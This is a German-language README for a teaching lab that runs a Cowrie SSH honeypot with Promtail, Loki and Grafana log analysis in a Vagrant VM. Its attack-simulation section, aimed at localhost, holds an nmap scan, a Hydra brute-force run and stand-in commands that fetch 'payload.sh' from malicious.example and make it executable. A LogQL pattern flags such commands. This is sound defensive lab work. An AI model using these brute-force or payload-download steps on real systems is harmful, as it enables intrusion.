# Cybersecurity-Honeypot-Plattform

## Projektübersicht

Dieses Projekt stellt eine automatisierte Laborumgebung bereit, in der SSH-Angriffe erfasst und ausgewertet werden können. Cowrie simuliert einen SSH-Server und protokolliert Verbindungen, Anmeldeversuche und eingegebene Befehle. In der erweiterten Ausbaustufe werden diese Ereignisse mit Promtail an Loki übertragen und in Grafana visualisiert.

Die Dokumentation trennt die Arbeit in zwei aufeinander aufbauende Phasen:

- **Phase 1 – Modularbeit:** Aufbau und Test eines funktionsfähigen Cowrie-Honeypots.
- **Phase 2 – Projektarbeit/Erweiterung:** Ergänzung einer zentralen Log-Pipeline und grafischen Auswertung mit Promtail, Loki und Grafana.

Die heute vorhandene Installation enthält bereits beide Phasen. Vagrant erstellt dafür eine Ubuntu-VM; Docker Compose startet und verwaltet alle Dienste.

> Die Umgebung ist ausschliesslich für Schulungs- und Testzwecke bestimmt. Angriffsversuche dürfen nur gegen dieses eigene Labor oder gegen ausdrücklich freigegebene Systeme durchgeführt werden.

## Abgrenzung der beiden Phasen

### Phase 1 – Modularbeit: Cowrie-Honeypot

Ziel der Modularbeit ist ein isolierter und reproduzierbarer SSH-Honeypot. Cowrie nimmt Verbindungen auf Port `2222` entgegen, simuliert eine Linux-Shell und schreibt die Aktivitäten als JSON-Ereignisse in eine Protokolldatei. Die Funktion wird mit einem Portscan, Anmeldeversuchen und einer interaktiven SSH-Sitzung geprüft. Die Ereignisse können direkt in den Cowrie-Protokollen kontrolliert werden.

Vagrant und Docker Compose gehören zur technischen Betriebsbasis: Vagrant stellt die virtuelle Maschine bereit, Docker Compose startet Cowrie als Container.

### Phase 2 – Projektarbeit: Monitoring und Visualisierung

Die Projektarbeit erweitert den Honeypot, ohne seine Grundfunktion zu verändern. Promtail liest die JSON-Protokolle von Cowrie fortlaufend ein und sendet sie an Loki. Loki speichert die Ereignisse zentral und stellt sie für LogQL-Abfragen bereit. Grafana verwendet Loki als Datenquelle und zeigt Verbindungen, fehlgeschlagene Anmeldungen sowie eingegebene und verdächtige Befehle in einem vorbereiteten Dashboard an.

Damit wird aus dem einzelnen Honeypot eine kleine Monitoring- und Analyseplattform.

## Architektur

### Architektur Phase 1

![Architektur der Phase 1 – Modularbeit](docs/phase-1-architektur.drawio.png)

**Datenfluss:** Verbindung → Ereigniserfassung → lokale Protokollierung

Der Schwerpunkt liegt auf dem Honeypot selbst: Dienst bereitstellen, Testangriffe annehmen und Ereignisse nachvollziehbar protokollieren. Vagrant und Docker Compose bilden die gemeinsame Betriebsbasis.

### Architektur Phase 2

![Architektur der Phase 2 – Projektarbeit und Erweiterung](docs/phase-2-architektur.drawio.png)

Alle Komponenten laufen als Docker-Container innerhalb derselben von Vagrant verwalteten Ubuntu-VM. Docker-Volumes speichern Cowrie-, Loki-, Promtail- und Grafana-Daten dauerhaft innerhalb der VM.

## Funktionsumfang

| Funktion | Phase 1: Modularbeit | Phase 2: Projektarbeit |
| --- | :---: | :---: |
| Reproduzierbare Ubuntu-VM mit Vagrant | ✓ | ✓ |
| Containerbetrieb mit Docker Compose | ✓ | ✓ |
| Simulierter SSH-Dienst mit Cowrie | ✓ | ✓ |
| Aufzeichnung von Verbindungen und Anmeldungen | ✓ | ✓ |
| Aufzeichnung eingegebener Befehle | ✓ | ✓ |
| Direkte Kontrolle der Cowrie-JSON-Protokolle | ✓ | ✓ |
| Automatische Log-Weiterleitung mit Promtail | – | ✓ |
| Zentrale Log-Speicherung in Loki | – | ✓ |
| Suche und Auswertung mit LogQL | – | ✓ |
| Vorbereitetes Grafana-Dashboard | – | ✓ |

## Komponenten

| Komponente | Aufgabe |
| --- | --- |
| **Cowrie** | Simuliert einen SSH-Server und zeichnet Verbindungen, Login-Versuche und Befehle als JSON-Ereignisse auf. |
| **Promtail** | Liest neue Cowrie-Ereignisse aus den JSON-Protokollen und übermittelt sie an Loki. |
| **Loki** | Speichert die Protokolle zentral und ermöglicht deren Abfrage mit LogQL. |
| **Grafana** | Fragt Loki ab und visualisiert die Ereignisse in einem Dashboard. |
| **Vagrant** | Erstellt und provisioniert die Ubuntu-VM, inklusive Portweiterleitungen zum Hostsystem. |
| **Docker Compose** | Erstellt, startet und verwaltet die Container der Plattform. |

## Voraussetzungen

Für den empfohlenen Betrieb mit VirtualBox werden benötigt:

- Git
- Vagrant 2.4 oder neuer
- VirtualBox 7.x
- aktivierte Hardware-Virtualisierung
- mindestens 4 GB freier Arbeitsspeicher
- ungefähr 10 GB freier Speicherplatz
- Internetzugang beim ersten Start

Optional wird Parallels Desktop mit dem Plugin `vagrant-parallels` unterstützt.

## Setup und Start

Repository klonen und in das Projektverzeichnis wechseln:

```bash
git clone <repository-url>
cd cybersecurity-honeypot-platform
```

Die VM und die vollständige Plattform starten:

```bash
cd honeypot-vm && vagrant up
```

Vagrant verwendet standardmässig einen verfügbaren Provider. Um VirtualBox oder Parallels ausdrücklich auszuwählen:

```bash
vagrant up --provider=virtualbox
# oder
vagrant up --provider=parallels
```

Beim ersten Start werden die Ubuntu-Box, Docker und die Container-Images geladen. Dieser Vorgang kann mehrere Minuten dauern. Anschliessend startet Docker Compose automatisch die vier Dienste `cowrie`, `promtail`, `loki` und `grafana`.

Status der Container prüfen:

```bash
vagrant ssh -c "cd /project && docker compose ps"
```

Alle vier Dienste sollten den Status `Up` besitzen. Loki kann zusätzlich unter <http://localhost:3100/ready> geprüft werden; nach einer kurzen Startzeit erscheint dort `ready`.

## Zugriff auf Grafana und Cowrie

| Dienst | Adresse | Zugang |
| --- | --- | --- |
| Grafana | <http://localhost:3000> | `admin` / `admin` |
| Cowrie SSH | `localhost:2222` | `root` / `toor` |
| Loki-Status | <http://localhost:3100/ready> | kein Login |

Nach der Anmeldung in Grafana ist Loki bereits als Standard-Datenquelle eingerichtet. Das Dashboard **Cowrie Honeypot Overview** befindet sich im Ordner **Honeypot**.

Die Beispiel-Zugangsdaten von Cowrie und Grafana sind absichtlich einfach und nur für das isolierte Labor vorgesehen.

## Angriffssimulation

Die folgenden Befehle werden auf dem Hostsystem ausgeführt und richten sich ausschliesslich gegen `127.0.0.1` beziehungsweise die eigene VM.

Für die direkte Auswertung aus Phase 1 können die Cowrie-Ereignisse parallel in einem zweiten Terminal verfolgt werden:

```bash
vagrant ssh -c "sudo tail -f /var/lib/docker/volumes/honeypot_cowrie-data/_data/log/cowrie/cowrie.json"
```

In Phase 2 lassen sich dieselben Ereignisse im Grafana-Dashboard und mit den weiter unten aufgeführten LogQL-Abfragen untersuchen.

### Portscan mit Nmap

```bash
nmap -sV -p 2222 127.0.0.1
```

Der Scan sollte einen SSH-Dienst erkennen. Typische Cowrie-Ereignisse sind `cowrie.session.connect`, `cowrie.client.version` und `cowrie.session.closed`.

### Login-Versuche mit Hydra

Eine kleine Testliste erstellen und gegen Cowrie verwenden (hydra muss dafür lokal installiert sein):

```bash
printf "admin\npassword\n123456\ntoor\n" > passwords.txt
hydra -l root -P passwords.txt ssh://127.0.0.1:2222
```

Dabei entstehen unter anderem die Ereignisse `cowrie.login.failed` und `cowrie.login.success`. Nmap und Hydra sind optionale Testwerkzeuge und werden nicht für den Betrieb der Plattform benötigt.

### Interaktive SSH-Sitzung

```bash
ssh -p 2222 root@127.0.0.1
```

Als Passwort wird `toor` verwendet. In der simulierten Shell können beispielsweise folgende Befehle eingegeben werden:

```bash
whoami
uname -a
id
ls -la
wget http://malicious.example/payload.sh
curl http://malicious.example/payload.sh -o /tmp/payload.sh
chmod +x /tmp/payload.sh
exit
```

Cowrie führt diese Aktionen nicht auf dem Hostsystem aus, sondern simuliert sie und protokolliert die Eingaben als `cowrie.command.input`. Im Grafana-Dashboard sollten danach die Anzahl der Sitzungen sowie die Panels für ausgeführte und verdächtige Befehle aktualisiert werden.

## Wichtigste LogQL-Abfragen

Die Abfragen können in Grafana unter **Explore** mit der Datenquelle **Loki** ausgeführt werden.

Alle Cowrie-Ereignisse:

```logql
{job="cowrie"}
```

Neue SSH-Verbindungen:

```logql
{job="cowrie", eventid="cowrie.session.connect"}
```

Fehlgeschlagene Anmeldungen:

```logql
{job="cowrie", eventid="cowrie.login.failed"}
```

Erfolgreiche Anmeldungen:

```logql
{job="cowrie", eventid="cowrie.login.success"}
```

Eingegebene Befehle:

```logql
{job="cowrie", eventid="cowrie.command.input"}
```

Verdächtige Befehle mit `wget`, `curl`, `chmod` oder `payload`:

```logql
{job="cowrie", eventid="cowrie.command.input"} | json | input =~ "(?i).*(wget|curl|chmod|payload).*"
```

Anzahl fehlgeschlagener Anmeldungen im gewählten Grafana-Zeitraum:

```logql
sum(count_over_time({job="cowrie", eventid="cowrie.login.failed"}[$__range]))
```

## Bedienung und Fehlersuche

Die Befehle werden im Verzeichnis `honeypot-vm` ausgeführt:

```bash
# VM anhalten und erneut starten
vagrant halt
vagrant up

# Shell der VM öffnen
vagrant ssh

# Containerstatus und aktuelle Container-Protokolle anzeigen
vagrant ssh -c "cd /project && docker compose ps"
vagrant ssh -c "cd /project && docker compose logs --tail=100"

# Provisionierung erneut ausführen
vagrant provision
```

Bei Parallels wird das Projekt per RSync in die VM kopiert. Änderungen können wie folgt übertragen und angewendet werden:

```bash
vagrant rsync
vagrant ssh -c "cd /project && docker compose up -d --build"
```

VirtualBox verwendet dagegen einen direkt eingebundenen Projektordner.

Die VM kann bei Bedarf vollständig entfernt und mit `vagrant up` neu erstellt werden:

```bash
vagrant destroy -f
```

Dabei gehen die Docker-Volumes innerhalb der VM verloren. Manuell erstellte Grafana-Dashboards sollten vorher exportiert werden.

## Projektstruktur

```text
cybersecurity-honeypot-platform/
├── README.md
├── docker-compose.yml
├── cowrie/
├── grafana/
│   └── provisioning/
├── honeypot-vm/
│   ├── Vagrantfile
│   └── scripts/
├── loki/
└── promtail/
```

## Ausblick

Die bestehende Plattform kann später ergänzt werden, ohne die aktuelle Architektur grundsätzlich umzubauen:

- **Alerts:** Grafana kann bei auffälligen Login-Raten oder bestimmten Befehlen Benachrichtigungen auslösen.
- **GeoIP:** Quell-IP-Adressen können geografisch angereichert und als Herkunftsregionen dargestellt werden.
- **Wazuh:** Eine zusätzliche SIEM-/XDR-Lösung kann Ereignisse korrelieren, Regeln anwenden und die Analyse erweitern.

Diese Punkte sind bewusst als mögliche Weiterentwicklung abgegrenzt und nicht Bestandteil der beiden umgesetzten Phasen.

## Sicherheitshinweis

Der Honeypot verwendet absichtlich schwache Beispiel-Zugangsdaten und ist nicht als produktiv abgesichertes System konzipiert. Er darf nicht ohne zusätzliche Schutzmassnahmen direkt aus dem Internet erreichbar gemacht werden. Alle beschriebenen Scan- und Angriffstests sind nur in der eigenen Laborumgebung oder mit ausdrücklicher Genehmigung zulässig.
